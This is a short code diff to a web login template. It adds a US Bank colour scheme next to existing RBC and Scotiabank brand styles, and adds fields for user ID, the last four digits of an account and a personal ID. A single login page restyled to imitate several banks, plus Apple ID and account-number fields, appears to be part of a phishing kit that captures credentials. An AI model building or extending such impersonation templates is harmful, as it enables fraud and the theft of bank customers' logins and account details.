@@ -675,6 +675,14 @@
   body.brand-rbc button { background:#005DAA; border-radius:4px; background-image:none; font-weight:700; }
   body.brand-rbc button:hover { background:#004d8e; transform:none; filter:none; }
 
+  body.brand-usbank { background:#CC0000; color:#fff; }
+  body.brand-usbank .auth { background:#fff; color:#000; border-radius:4px; border:none; box-shadow:0 2px 8px rgba(0,0,0,.2); }
+  body.brand-usbank h1 { color:#CC0000; }
+  body.brand-usbank input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#000; }
+  body.brand-usbank input:focus { border-color:#CC0000; box-shadow:none; background:#fff; }
+  body.brand-usbank button { background:#CC0000; border-radius:4px; background-image:none; font-weight:700; }
+  body.brand-usbank button:hover { background:#a80000; transform:none; filter:none; }
+
   body.brand-scotiabank { background:#EC111A; color:#fff; }
   body.brand-scotiabank .auth { background:#fff; color:#000; border-radius:4px; border:none; box-shadow:0 2px 8px rgba(0,0,0,.2); }
   body.brand-scotiabank h1 { color:#EC111A; }
@@ -1214,7 +1222,10 @@
       booking_ref: 'Booking reference',
       last_name: 'Last name',
       apple_id: 'Apple ID (Email)',
-      account_number: 'Account number'
+      account_number: 'Account number',
+      user_id: 'User ID',
+      account_last4: 'Last 4 digits of account',
+      personal_id: 'Personal ID'
     } %>
     <% pageContent.fields.forEach(f => {
       const type = f === 'password' ? 'password' : f === 'email' || f === 'apple_id' ? 'email' : f === 'phone' ? 'tel' : f === 'dob' ? 'date' : 'text';
